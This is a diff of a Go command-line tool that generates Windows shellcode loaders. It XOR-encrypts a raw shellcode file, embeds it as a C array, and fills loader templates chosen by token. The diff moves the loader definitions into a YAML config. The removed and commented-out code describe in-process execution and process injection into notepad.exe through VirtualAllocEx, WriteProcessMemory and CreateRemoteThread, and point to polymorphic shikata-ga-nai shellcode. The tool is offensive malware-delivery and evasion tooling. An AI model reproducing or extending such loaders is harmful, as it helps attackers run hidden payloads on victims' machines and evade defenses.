@@ -6,10 +6,40 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+
+	"gopkg.in/yaml.v2"
 )
 
+type ShellcodeConfig struct {
+	SourcePath        string            `yaml:"sourcePath"`
+	IncludePath       string            `yaml:"includePath"`
+	Substitutions     map[string]string `yaml:"substitutions"`
+	IncludeGuard      string            `yaml:"includeGuard"`
+	SourceOutputName  string            `yaml:"sourceOutputName"`
+	IncludeOutputName string            `yaml:"includeOutputName"`
+}
+
+type FileConfig struct {
+	SourcePath    string            `yaml:"sourcePath"`
+	OutputPath    string            `yaml:"outputPath"`
+	Substitutions map[string]string `yaml:"substitutions"`
+}
+
+type LoaderConfig struct {
+	Token       string       `yaml:"token"`
+	EncType     *string      `yaml:"enc_type"`
+	KeyRequired bool         `yaml:"key_required"`
+	Method      string       `yaml:"method"`
+	Files       []FileConfig `yaml:"files"`
+}
+
+type Config struct {
+	Shellcode ShellcodeConfig `yaml:"shellcode_template"`
+	Loader    []LoaderConfig  `yaml:"loader_template"`
+}
+
 var (
-	shellcodePath = flag.String("bin", "", "Path to shellcode .bin file")
+	binPath       = flag.String("bin", "", "Path to shellcode .bin file")
 	outputPath    = flag.String("out", "", "Output folder")
 	ldrToken      = flag.String("ldr", "", "Loader token")
 	enc           = flag.String("enc", "", "Encryption type (optional)")
@@ -19,34 +49,7 @@ var (
 	help          = flag.Bool("help", false, "Print help")
 )
 
-type token struct {
-	name   string
-	method string
-	enc    bool
-}
-
-var tokens = []token{
-	{
-		name:   "inline",
-		method: "VirtualAlloc, memcpy, ((void(*)())exec)();",
-		enc:    false,
-	},
-	{
-		name:   "inline_xor",
-		method: "VirtualAlloc, xorShellcode, memcpy, ((void(*)())exec)();",
-		enc:    true,
-	},
-	{
-		name:  "createremotethread",
-		method: "OpenProcess, VirtualAllocEx (PAGE_EXECUTE_READWRITE), WriteProcessMemory, CreateRemoteThread, WaitForSingleObject, CloseHandle",
-		enc:   false,
-	},
-	{
-		name:   "createremotethreadrx",
-		method: "OpenProcess, VirtualAllocEx (PAGE_READWRITE), WriteProcessMemory, VirtualProtect (PAGE_EXECUTE_READ), CreateRemoteThread, WaitForSingleObject, CloseHandle",
-		enc:    false,
-	},
-}
+var Templates Config
 
 func PrintHelp() {
 	text := `
@@ -92,17 +95,17 @@ Examples:
 }
 
 func tokenMethod(token string) string {
-	for _, t := range tokens {
-		if strings.EqualFold(t.name, token) {
-			return t.method
+	for _, t := range Templates.Loader {
+		if strings.EqualFold(t.Token, token) {
+			return t.Method
 		}
 	}
 	return ""
 }
 
 func tokenExists(token string) bool {
-	for _, t := range tokens {
-		if strings.EqualFold(t.name, token) {
+	for _, t := range Templates.Loader {
+		if strings.EqualFold(t.Token, token) {
 			return true
 		}
 	}
@@ -110,9 +113,9 @@ func tokenExists(token string) bool {
 }
 
 func tokenEnc(token string) bool {
-	for _, t := range tokens {
-		if strings.EqualFold(t.name, token) {
-			return t.enc
+	for _, t := range Templates.Loader {
+		if strings.EqualFold(t.Token, token) {
+			return t.KeyRequired
 		}
 	}
 	return false
@@ -173,7 +176,7 @@ func ToCArray(filePath string) (string, error) {
 	return fmt.Sprintf("{ %s }", strings.Join(byteArray, ", ")), nil
 }
 
-func ProcessShellcodeTemplate(shellcodePath string, args ...string) error {
+func ProcessShellcodeTemplate(binPath string, args ...string) error {
 	if len(args) > 1 {
 		enc := args[0]
 		key := args[1]
@@ -181,7 +184,7 @@ func ProcessShellcodeTemplate(shellcodePath string, args ...string) error {
 		switch enc {
 		case "xor":
 			fmt.Println("[!!!] XORing shellcode with key:", key)
-			shellcode, err := os.ReadFile(shellcodePath)
+			shellcode, err := os.ReadFile(binPath)
 			if err != nil {
 				return err
 			}
@@ -199,37 +202,36 @@ func ProcessShellcodeTemplate(shellcodePath string, args ...string) error {
 				shellcode[i] ^= key[i%len(key)]
 			}
 
-			err = os.WriteFile(shellcodePath+".enc", shellcode, 0o644)
+			err = os.WriteFile(binPath+".enc", shellcode, 0o644)
 			if err != nil {
 				return err
 			}
 
-			shellcodePath = shellcodePath + ".enc"
+			binPath = binPath + ".enc"
 
-			fmt.Printf("[*] Encrypted shellcode saved to: %s\n\n", shellcodePath)
+			fmt.Printf("[*] Encrypted shellcode saved to: %s\n\n", binPath)
 
 		default:
-			// enc type specified is empty
 		}
 	}
 
-	shellcodeArray, err := ToCArray(shellcodePath)
+	shellcodeArray, err := ToCArray(binPath)
 	if err != nil {
 		return err
 	}
 
-	fileInfo, err := os.Stat(shellcodePath)
+	fileInfo, err := os.Stat(binPath)
 	if err != nil {
 		return err
 	}
 
-	shellcode_template, err := ReadFile(filepath.Join(*template_path, "Source/Shellcode.c"))
+	shellcode_template, err := ReadFile(filepath.Join(*template_path, Templates.Shellcode.SourcePath))
 	if err != nil {
 		return err
 	}
 
-	shellcodeTemplate := strings.ReplaceAll(shellcode_template, "${SHELLCODE}", shellcodeArray)
-	shellcodeTemplate = strings.ReplaceAll(shellcodeTemplate, "${SHELLCODE_SIZE}", fmt.Sprintf("%d", fileInfo.Size()))
+	shellcodeTemplate := strings.ReplaceAll(shellcode_template, Templates.Shellcode.Substitutions["shellcode"], shellcodeArray)
+	shellcodeTemplate = strings.ReplaceAll(shellcodeTemplate, Templates.Shellcode.Substitutions["shellcode_size"], fmt.Sprintf("%d", fileInfo.Size()))
 
 	abs, err := filepath.Abs(strings.TrimSpace(*outputPath))
 	if err != nil {
@@ -241,20 +243,20 @@ func ProcessShellcodeTemplate(shellcodePath string, args ...string) error {
 	fmt.Println("[SHELLCODE] Shellcode size:", fileInfo.Size(), "bytes")
 	fmt.Println("[SHELLCODE] Starting bytes: ", shellcodeArray[0:24], "... }")
 
-	err = SaveToFile(*outputPath, "Shellcode.c", shellcodeTemplate)
+	err = SaveToFile(*outputPath, Templates.Shellcode.SourceOutputName, shellcodeTemplate)
 	if err != nil {
 		return err
 	}
 
 	fmt.Println("[*] Shellcode.c -> OK")
 
-	header_template, err := ReadFile(filepath.Join(*template_path, "Include/Shellcode.h"))
+	header_template, err := ReadFile(filepath.Join(*template_path, Templates.Shellcode.IncludePath))
 	if err != nil {
 		return err
 	}
 	fmt.Println("[*] Shellcode.h -> OK")
 
-	err = SaveToFile(*outputPath, "Shellcode.h", header_template)
+	err = SaveToFile(*outputPath, Templates.Shellcode.IncludeOutputName, header_template)
 	if err != nil {
 		return err
 	}
@@ -274,99 +276,115 @@ func ProcessLoaderTemplate(token string, args ...string) error {
 	method := tokenMethod(token)
 	fmt.Println("[LDR] Using:", method)
 
-	switch token {
-	case "inline":
-		ldr, err := ReadFile(filepath.Join(*template_path, "Source/Inline.c"))
-		if err != nil {
-			return err
+	for _, l := range Templates.Loader {
+		if strings.EqualFold(l.Token, token) {
+
+			if l.EncType != nil {
+				if enc != "" {
+					if !strings.EqualFold(*l.EncType, enc) {
+						fmt.Println("[LDR] Warning: Enc type specified does not match the one required by the loader token:", *l.EncType)
+					}
+				} else {
+					fmt.Println("[LDR] Warning: Enc type not specified, using default type:", *l.EncType)
+				}
+			}
+
+			if l.KeyRequired {
+				if key != "" {
+					fmt.Println("[LDR] Using key:", key)
+				} else {
+					fmt.Println("[LDR] Warning: Key not specified, using default key:", key)
+				}
+			} else {
+				if key != "" {
+					fmt.Println("[LDR] Warning: Key specified, but not needed for this loader token:", token)
+				}
+			}
+
+			fmt.Println("[LDR] Using:", l.Token)
+			for _, f := range l.Files {
+				content, err := ReadFile(filepath.Join(*template_path, f.SourcePath))
+				if err != nil {
+					return err
+				}
+
+				for k, v := range f.Substitutions {
+					switch k {
+					case "key":
+						if key != "" {
+							content = strings.ReplaceAll(content, v, key)
+						} else {
+							content = strings.ReplaceAll(content, v, "aaaabbbbccccdddd")
+						}
+					}
+				}
+
+				err = SaveToFile(*outputPath, f.OutputPath, content)
+				if err != nil {
+					return err
+				}
+			}
+			return nil
 		}
-
-		err = SaveToFile(*outputPath, "Main.c", ldr)
-		if err != nil {
-			return err
-		}
-
-	case "inline_xor":
-
-		/*
-			need to pass key into ldr template
-		*/
-
-		fmt.Println("[LDR] enc_type: ", enc)
-		fmt.Println("[LDR] key: ", key)
-		ldr, err := ReadFile(filepath.Join(*template_path, "Source/Inline_Xor.c"))
-		if err != nil {
-			return err
-		}
-
-		ldr = strings.ReplaceAll(ldr, "${KEY}", key)
-		err = SaveToFile(*outputPath, "Main.c", ldr)
-		if err != nil {
-			return err
-		}
-
-		xor, err := ReadFile(filepath.Join(*template_path, "Source/Xor.c"))
-		if err != nil {
-			return err
-		}
-
-		err = SaveToFile(*outputPath, "Xor.c", xor)
-		if err != nil {
-			return err
-		}
-
-		xor_h, err := ReadFile(filepath.Join(*template_path, "Include/Xor.h"))
-		if err != nil {
-			return err
-		}
-
-		err = SaveToFile(*outputPath, "Xor.h", xor_h)
-		if err != nil {
-			return err
-		}
-
-	case "createremotethread":
-
-		/*
-			ldr looks for "notepad.exe" change this to your requirements at: ./{template}/Source/CreateRemoteThread.c
-			allocates RWX memory sections, use this for:
-			- https://unprotect.it/technique/shikata-ga-nai-sgn/#:~:text=Shikata%20Ga%20Nai%20(SGN)%20is,a%20self%2Ddecoding%20obfuscated%20shellcode.
-			- any shellcode that changes itself at runtime (e.g. polymorphic shellcode)
-		*/
-
-		ldr, err := ReadFile(filepath.Join(*template_path, "Source/CreateRemoteThread.c"))
-		if err != nil {
-			return err
-		}
-
-		err = SaveToFile(*outputPath, "Main.c", ldr)
-		if err != nil {
-			return err
-		}
-	
-	case "createremotethreadrx":
-		/* 
-			ldr looks for "notepad.exe" change this to your requirements at: ./{template}/Source/CreateRemoteThreadRX.c
-			allocates RWX, writes shellcode to memory, changes memory to RX, creates remote thread
-			VirtualProtectEx
-		*/
-
-		ldr, err := ReadFile(filepath.Join(*template_path, "Source/CreateRemoteThreadRX.c"))
-		if err != nil {
-			return err
-		}
-
-		err = SaveToFile(*outputPath, "Main.c", ldr)
-		if err != nil {
-			return err
-		}
-		
-	default:
-		fmt.Println("Unknown token:", token)
 	}
 
-	fmt.Println("[*] Main.c -> OK")
 	return nil
+
+	// case "createremotethread":
+
+	// 	/*
+	// 		ldr looks for "notepad.exe" change this to your requirements at: ./{template}/Source/CreateRemoteThread.c
+	// 		allocates RWX memory sections, use this for:
+	// 		- https://unprotect.it/technique/shikata-ga-nai-sgn/#:~:text=Shikata%20Ga%20Nai%20(SGN)%20is,a%20self%2Ddecoding%20obfuscated%20shellcode.
+	// 		- any shellcode that changes itself at runtime (e.g. polymorphic shellcode)
+	// 	*/
+
+	// 	ldr, err := ReadFile(filepath.Join(*template_path, "Source/CreateRemoteThread.c"))
+	// 	if err != nil {
+	// 		return err
+	// 	}
+
+	// 	err = SaveToFile(*outputPath, "Main.c", ldr)
+	// 	if err != nil {
+	// 		return err
+	// 	}
+
+	// case "createremotethreadrx":
+	// 	/*
+	// 		ldr looks for "notepad.exe" change this to your requirements at: ./{template}/Source/CreateRemoteThreadRX.c
+	// 		allocates RWX, writes shellcode to memory, changes memory to RX, creates remote thread
+	// 		VirtualProtectEx
+	// 	*/
+
+	// 	ldr, err := ReadFile(filepath.Join(*template_path, "Source/CreateRemoteThreadRX.c"))
+	// 	if err != nil {
+	// 		return err
+	// 	}
+
+	// 	err = SaveToFile(*outputPath, "Main.c", ldr)
+	// 	if err != nil {
+	// 		return err
+	// 	}
+
+	// default:
+	// 	fmt.Println("Unknown token:", token)
+	// }
+
+	// fmt.Println("[*] Main.c -> OK")
+	// return nil
+}
+
+func readConfig(path string) (*Config, error) {
+	var config Config
+	configFile, err := os.ReadFile(path)
+	if err != nil {
+		return nil, err
+	}
+	err = yaml.Unmarshal(configFile, &config)
+	if err != nil {
+		return nil, err
+	}
+	return &config, nil
 }
 
 func init() {
@@ -378,7 +396,7 @@ func init() {
 		os.Exit(0)
 	}
 
-	if *shellcodePath == "" || *outputPath == "" || *ldrToken == "" {
+	if *binPath == "" || *outputPath == "" || *ldrToken == "" {
 		PrintHelp()
 		os.Exit(0)
 	}
@@ -387,6 +405,14 @@ func init() {
 		fmt.Println("[*] Using default template path: ./templates")
 		*template_path = "./templates"
 	}
+
+	config, err := readConfig(filepath.Join(*template_path, "config.yaml"))
+	if err != nil {
+		fmt.Println("[!] Error reading config file:", err)
+		os.Exit(1)
+	}
+
+	Templates = *config
 
 	if !tokenExists(*ldrToken) {
 		fmt.Println("[*] Unknown loader token:", *ldrToken)
@@ -416,7 +442,7 @@ func init() {
 }
 
 func main() {
-	err := ProcessShellcodeTemplate(*shellcodePath, *enc, *key)
+	err := ProcessShellcodeTemplate(*binPath, *enc, *key)
 	if err != nil {
 		fmt.Println("Error processing shellcode:", err)
 		return
@@ -429,8 +455,8 @@ func main() {
 	}
 
 	if *enc != "" && *cleanup {
-		fmt.Println("[CLEANUP] Removing encrypted shellcode file:", *shellcodePath+".enc")
-		err = os.Remove(*shellcodePath + ".enc")
+		fmt.Println("[CLEANUP] Removing encrypted shellcode file:", *binPath+".enc")
+		err = os.Remove(*binPath + ".enc")
 		if err != nil {
 			fmt.Println("[!] Error removing encrypted shellcode file:", err)
 			return
